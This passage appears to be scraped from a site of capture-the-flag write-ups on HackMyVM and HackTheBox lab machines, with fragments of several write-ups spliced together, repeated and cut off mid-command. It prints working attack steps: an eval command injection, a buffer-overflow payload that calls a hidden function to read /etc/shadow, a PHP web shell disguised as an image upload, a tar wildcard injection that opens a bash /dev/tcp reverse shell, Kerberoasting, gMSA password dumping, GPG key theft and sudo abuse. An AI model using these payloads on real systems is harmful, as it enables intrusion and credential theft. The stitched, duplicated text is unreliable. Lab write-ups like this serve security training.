vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection. Now, /usr/bin/bash has the SUID bit set.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 0\u0026gt;\u0026amp;1\u0026#34; \u0026gt; revshell.sh\recho \u0026#34;\u0026#34; \u0026gt; --checkpoint=1\recho \u0026#34;\u0026#34; \u0026gt; \u0026#34;--checkpoint-action=exec=bash revshell.sh\u0026#34; We are now the Developer user.\nBy running the command sudo -l, we see that the script sysinfo.sh can be executed as alfonso without providing a password.\nThe script is vulnerable because it uses eval with user input, which allows executing dangerous commands. An attacker can exploit this to run any command.\nTo test this, in the first input we enter 1, and in the second input we enter the command id, but we precede it with a ; to separate commands. It will then execute:\ndf; id It is vulnerable, so it’s as simple as running a Reverse Shell to become alfonso.\nNow we can retrieve the User Flag.\nRoot Escalation The last step is to escalate to root. Again, by using sudo -l, we see that we can execute a binary as any user without providing their password. We could try to exploit this to escalate to root.\nWe copy the file to Alfonso’s folder, start a temporary web server with Python, and download the binary to our local machine to test it in a more controlled environment.\nWe give it execution permissions and run it.\nWe can see that it outputs user data from /etc/passwd.\nNow, we will open it with Ghidra to analyze how it is implemented internally.\nWe can now see that it might be vulnerable to a Buffer Overflow because gets(buffer) allows writing more data than the buffer can hold, overwriting memory and potentially executing malicious code.\nHowever, by examining the code further, we find a function that has never been executed, which prints the contents of the /etc/shadow file.\nThe plan is to exploit it using a Buffer Overflow to ultimately execute this function called get_shadow.\nBuffer Overflow Exploitation We will first create the complete payload on our local machine using gdb. Here’s a guide on how to exploit a buffer overflow to execute functions: Buffer Overflow - Invoking Functions\nFirst, we create a pattern to find the offset and run the script, providing this pattern as input.\n📝NOTE: In a Buffer Overflow, the offset is the number of bytes needed to reach the return address, which in x86 corresponds to the EIP. Overwriting it allows controlling where the program jumps when the function ends.\nr \u0026lt;\u0026lt;\u0026lt; \u0026#39;PATTERN\u0026#39; Now we can calculate how many characters are needed to reach the EIP with this command:\npattern offset $eip We can verify it like this to confirm the offset is actually 76:\nr \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;print(\u0026#34;A\u0026#34;*76 + \u0026#34;B\u0026#34;*4)\u0026#39;) It is indeed 76. Next, we need the memory address of the get_shadow function we found earlier in Ghidra.\np get_shadow We must write the address in little-endian (for example, 0x080484b6 as \\xb6\\x84\\x04\\x08), since systems store multi-byte values in that order for the function to execute correctly.\nIn our case, it will be:\n\\x05\\x99\\x04\\x08 We start converting from the end to the beginning.\rNow we have everything. Instead of BBBB, we use \\x05\\x99\\x04\\x08. The best way to execute it is:\n./silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We will run it directly on the target machine, using sudo and the full path to the binary.\nsudo /usr/bin/silentgets \u0026lt;\u0026lt;\u0026lt; $(python3 -c \u0026#39;import sys; sys.stdout.buffer.write(b\u0026#34;A\u0026#34;*76 + b\u0026#34;\\x05\\x99\\x04\\x08\u0026#34;)\u0026#39;) We obtain the root user’s password hash, which we will crack using hashcat.\nhashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt Password obtained!

After a few minutes of searching, I didn’t find anything. The next step I have in mind is to use BloodHound to map the target’s Active Directory structure, identify relationships between users, groups, and permissions, and find potential privilege escalation paths within the domain.

This allows us to perform a Kerberoasting attack to obtain their password hash and escalate privileges within the domain.\nTo do this, we first clone the targetedKerberoast repository.\ngit clone https://github.com/ShutdownRepo/targetedKerberoast.git To perform the attack, we need to be time-synchronized.\nsudo ntpdate tombwatcher.htb In my case, I use ntpdate only to get the target machine’s time, then use faketime, because on Kali the time doesn’t sync properly.

Once Alfred is a member of this group, we gain ReadGMSAPassword permission on the user ANSIBLE_DEV$, which allows us to read the password of their Kerberos-managed account and use it to escalate privileges within the domain.\nWe use bloodyAD instead of net rpc because bloodyAD communicates directly with Active Directory via LDAP or modern RPC and can handle domain permissions that net rpc cannot. It is also more reliable for adding users to groups when net rpc fails due to restrictions or compatibility issues.\nbloodyAD -u \u0026#39;alfred\u0026#39; -p \u0026#39;basketball\u0026#39; -d tombwatcher.htb --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE alfred\r[+] alfred added to INFRASTRUCTURE The next step is to exploit the ReadGMSAPassword permission, and BloodHound shows us how to perform the attack.\nWe clone the gMSADumper repository to our local machine.\ngit clone https://github.com/micahvandeusen/gMSADumper.git And run the following command:\n./gMSADumper.py -u alfred -p basketball -d tombwatcher.htb With this hash, we can authenticate as ANSIBLE_DEV$ on the domain, whether for pass-the-hash, Kerberos attacks, or privilege escalation to access restricted resources.\nThe next step is to force the Sam user to change their password.

See CVE-2024-49019 or the wiki for more details. The WebServer template has a vulnerability (ESC15) that allows us to create a certificate as if we were another user. This means we could gain access to important accounts, including Domain Admin, and use it to escalate privileges within the domain.

In other words, before interacting with SMB, we need a TGT (Ticket Granting Ticket) that proves our identity to the KDC (Key Distribution Center, the central server that issues authentication tickets in the domain).\nTo obtain the TGT, we first synchronize the clock with the domain server, since Kerberos is sensitive to time differences.\nsudo ntpdate voleur.htb Since Kali doesn’t sync directly with the domain server using ntpdate, I used faketime to simulate the correct time in the process of generating the ticket.\nfaketime \u0026#39;YYYY-MM-DD HH:MM:SS\u0026#39; impacket-getTGT voleur.htb/\u0026#39;ryan.naylor\u0026#39;:\u0026#39;HollowOct31Nyt\u0026#39; Then, I exported the generated file to the KRB5CCNAME environment variable.\nexport KRB5CCNAME=$PWD/ryan.naylor.ccache This tells all Kerberos tools (and SMB in our case) to use that ticket instead of attempting to authenticate directly with the password.\nYou can use klist to verify that the ticket was loaded correctly.\nNow, to access the shared resources, instead of smbclient I used impacket-smbclient, as it offers more reliable Kerberos support and allows directly using cached tickets (-k -no-pass).\nfaketime \u0026#34;$(ntpdate -q voleur.htb | awk \u0026#39;{print $1 \u0026#34; \u0026#34; $2}\u0026#39;)\u0026#34; impacket-smbclient -k -no-pass -dc-ip 10.10.11.76 VOLEUR.HTB/ryan.naylor@dc.voleur.htb We found an Excel file that is password protected, so we cannot open it directly.

In case the id_rsa is not in that directory but, for example, in /root/.ssh/id_rsa, we should create a symbolic link pointing to it like this:\nln -s /root/.ssh/id_rsa id_rsa With this approach, we can obtain any file owned by root without any issues.

We will test it with:\nhttp://environment.htb/?--env=test We continue exploring other paths to see if we can find something more useful.\nThe interesting part is found on the /login page.\nIf we intercept the request with Burp Suite and leave the “remember” field empty, submitting the request will trigger a code error.\nAs we can see, if we change the environment to “preprod”, it gives us a session as the user with ID 1 and redirects us to /management/dashboard. Since Laravel is vulnerable to changing the environment name, we can access it without issues.\nWe are logged in as Hish, but we don’t find any direct way to access the machine. For now, the only available attack vector is uploading Hish’s profile picture.\nFirst, we test if we can upload an image, and it works without issues.\nNow, the challenge is to upload a malicious file that allows code execution, making it appear as an image to the website, even though it actually contains PHP code.\nWe could try uploading the following code, which would allow us to execute commands remotely and even establish a reverse shell:\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We managed to upload it by bypassing with \u0026ldquo;cmd.php.\u0026rdquo;.

We also see a folder called backup.\nInside the backup folder, there is a file called keyvault.gpg, which is an encrypted GPG file that could contain sensitive information such as keys, passwords, or important configuration data.\nA user’s GPG keys are usually stored in their home directory, inside a hidden folder called .gnupg. This folder contains both public and private keys, the trust database, and GPG configuration. Only the owning user and root should normally have access.\nThis is vulnerable because the .gnupg directory has too permissive permissions, any user on the system can read its contents and enter it, even if they cannot modify it. Since private keys and sensitive GPG data are stored here, these permissions allow us to finally extract the contents of keyvault.gpg.\nTo do this, we copy the entire .gnupg content to a directory where we have write permissions, such as /tmp, and then we can use that directory as the --homedir for the gpg command. This allows us to access the user’s keys and perform encryption or decryption operations without being the original directory owner.\ncd /tmp \u0026amp;\u0026amp; mkdir gnupg\rcp -r /home/hish/.gnupg/* ./gnupg\rgpg --homedir=./gnupg -d /home/hish/backup/keyvault.gpg And we succeed in getting the password for the user Hish on this machine.\nPrivilege escalation to Root Running sudo -l, we see that we can execute the systeminfo script as any user without needing to provide a password.\nScript contents:\n#!/bin/bash\recho -e \u0026#34;\\n### Displaying kernel ring buffer logs (dmesg) ###\u0026#34;\rdmesg | tail -n 10\recho -e \u0026#34;\\n### Checking system-wide open ports ###\u0026#34;\rss -antlp\recho -e \u0026#34;\\n### Displaying information about all mounted filesystems ###\u0026#34;\rmount | column -t\recho -e \u0026#34;\\n### Checking system resource limits ###\u0026#34;\rulimit -a\recho -e \u0026#34;\\n### Displaying loaded kernel modules ###\u0026#34;\rlsmod | head -n 10\recho -e \u0026#34;\\n### Checking disk usage for all filesystems ###\u0026#34;\rdf -h As we can see, this script doesn’t contain anything interesting and doesn’t allow privilege escalation.

I am going to send myself a Reverse Shell and set up the TTY.\nNow that we are inside, let\u0026rsquo;s enumerate the existing users on the machine.\ngrep /bin/bash /etc/passwd Existing users\rWe find two users: prakasaka and root.\nPrivilege escalation to Prakasaka I decided to navigate to prakasaka’s home directory, and as the www-data user, we can read the User Flag.\nThe next step to escalate privileges is to read the file secret.php, where we find the password for the user prakasaka.\nWe are prakasaka\rPrivilege escalation to Root Next, we run the command sudo -l to list the commands that the user prakasaka is allowed to execute with elevated sudo privileges.\nPrivilege escalation with the ip binary\rWe have permission to execute /bin/ip with root privileges. To escalate to root, let’s consult GTFObins and use the recommended commands for /bin/ip. Specifically, we will run the following commands to gain root access:\nsudo ip netns add foo sudo ip netns exec foo /bin/sh sudo ip netns delete foo We are finally the root user and can obtain the Root Flag.\n","permalink":"http://localhost:1313/writeups/easy/method/","summary":"Difficulty: Easy 🟢","title":"Method - HackMyVM"},{"content":"\rMachine Link\nTo begin, let\u0026rsquo;s find the IP of our target machine using arp-scan by executing the following command:\narp-scan -I eth0 --localnet 📝 NOTE: Normally, the MAC addresses of VirtualBox virtual machines start with 08:\nNow that we know its IP 192.168.18.169, let\u0026rsquo;s perform a port scan using NMAP to identify which ports are open, their services, and more information.\nNMAP scan\rSo now that we know it has ports 22 and 80 open, let\u0026rsquo;s access the web page hosted on this machine to see if we can find any useful information.\nIt tells us that the website is under maintenance, nothing more. So, I decide to use Gobuster to enumerate subdirectories, and I come across a text file named staff_statements.txt:\nGobuster enumeration\rstaff_statements.txt\rThe site is not yet repaired. Technicians are working on it by using old SSH connection files. Although the message doesn\u0026rsquo;t specify which files, I inferred it could involve older key files like id_rsa.bak rather than the current id_rsa. I searched for these old files, found them, and proceeded to download them.\nWe download id_rsa.bak\rNow that we have id_rsa.bak, we still need to know the username to log in. We already know the username since it is displayed when the machine starts:\nUser Jack\rBefore anything else, we need to grant permissions to the id_rsa.bak file with the following command:\nchmod 600 id_rsa.bak But when trying to access via SSH, it asks for a password, preventing us from entering.\nIt prevents us from accessing.\rSo, we can use John the Ripper to crack the password.\nssh2john id_rsa.bak \u0026gt; hash john --wordlist=/usr/share/wordlists/rockyou.txt hash John the Ripper result\rNow that we know the password, we can access.\nWe are the user Jack\rI decide, first of all, to check the users on this machine.\ngrep /bin/bash /etc/passwd Users on the machine\rAnd we find 3 users: jack, helder, root.\nNow it\u0026rsquo;s time for privilege escalation. In this case, we need to perform 2 privilege escalations to become the root user.\nPrivilege escalation to helder Now, let\u0026rsquo;s use LinPEAS, a tool for enumeration and security auditing. It focuses on identifying files with the SUID (Set User ID) and SGID (Set Group ID) permission bits set, which can potentially be exploited by attackers to escalate privileges and gain unauthorized access.\nWe download LinPEAS with the following command:\nwget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh We grant permissions for its execution and run it, saving the results in a file named LinpeasLog.\n./linpeas.sh \u0026gt; LinpeasLog And after some time of searching, I come across the following:\n📝 NOTE: The opasswd file stores users\u0026rsquo; old passwords in Linux to prevent them from reusing them when changing their password.\nAlthough it says it was Jack’s password, since some people reuse passwords (which is bad practice) we decided to check if it works for Helder. I tried it, and it worked. We obtained the user flag.\nUpon realizing that LinPEAS didn\u0026rsquo;t reveal anything new, I decide to use pspy. It is a process monitoring tool that provides real-time visibility into running processes without requiring elevated privileges. I downloaded it to my local machine and transferred it to the target machine by hosting a simple Python web server.\nNow we grant permissions and execute it.\nResult\rWe discovered a script that runs every minute as the root user (UID 0) and uses netcat to connect to localhost on port 10000, saving the data exchanged over the connection to a file named out in /root/.local/. Afterwards, it compares the contents of /root/.local/helder.txt and /home/helder/passwd.txt. If they match, it sets the SUID bit on the executable located in /usr/bin/, with the filename specified by the content of the out file.\nTo achieve this, the first step is to create the passwd.txt file in /home/helder as a symbolic link pointing to /root/.local/helder.txt. This ensures that passwd.txt contains the same content as helder.txt, so the condition will be true.\nln -s /root/.local/helder.txt /home/helder/passwd.txt ⚠️ IMPORTANT: A symbolic link is like a shortcut that points to another file. When a program accesses the link, it actually reads the file it points to. So even if you don’t own the original file, the program can access it through the link.\nThen, we check with the following command to confirm that it indeed points to /root/.local/helder.txt.\nls -la /home/helder/passwd.txt Now, we listen on port 10000 and send the text \u0026lsquo;bash\u0026rsquo;. When the script runs, it will save this input to the out file and set the SUID bit on the corresponding executable in /usr/bin/. In this case, we\u0026rsquo;re granting SUID permissions to bash.\necho \u0026#39;bash\u0026#39; | nc -lvnp 10000 What I mentioned can be observed in the code\rAfter executing the exploit, we notice a brief connection. Now, /usr/bin/bash has the SUID bit set.

When we access the website, we see that we can upload an image.\nBy enumerating directories and files with Gobuster, we discover the existence of a directory called /uploads, nothing else is visible.\nThis is where the images uploaded by users are stored.\nWe try uploading an image to see if it works.\nThe only way I see to gain access to the machine is to upload a file that allows us to execute commands without the machine noticing, making it think it is just an image. For example, we could embed malicious PHP code into a supposed image.\n\u0026lt;?php\recho \u0026#34;\u0026lt;pre\u0026gt;\u0026#34; . shell_exec($_REQUEST[\u0026#39;cmd\u0026#39;]) . \u0026#34;\u0026lt;/pre\u0026gt;\u0026#34;;\r?\u0026gt; We will create a file on our local machine called cmd.php.jpg containing the previous code, and when uploading it, we will intercept the request with Burp Suite. In the “Filename” field, we will change it to cmd.php while keeping the MIME type as if it were an image.\nWe upload it without any issues, and now we can execute any command.\nTo access the machine, we will use a Reverse Shell.\nNow that we are inside the machine, let’s see why it was so easy to exploit by uploading a PHP file without being detected.\nAs we can see, it only restricted by MIME type, without actually verifying that the file was truly an image or a GIF.\nThe www-data user is part of the developers group, and we see that they own two directories.\nIn /opt/project, we find an HTML file for someone named Vlad, but there’s not much else here.\nIn the other directory, it seems to contain a backup of what looks like the previous project.\nSince there’s nothing else particularly interesting, we could use the tool pspy to see which processes and tasks are running on the system in real time.\nWe can see that every minute, the Developer user performs a backup of everything in /opt/project, placing it into a file called project.tgz inside /var/backups/ and compressing it with gzip to save space.\nIt is vulnerable because we have write permissions and it uses * to include all files. If there’s a file with a malicious name, that name could be executed as a command during the backup. Here’s an explanation on how to exploit this vulnerability: Wildcard Injection\nWe execute the following commands in /opt/project and wait to receive the shell:\necho \u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/YOUR_IP/PORT 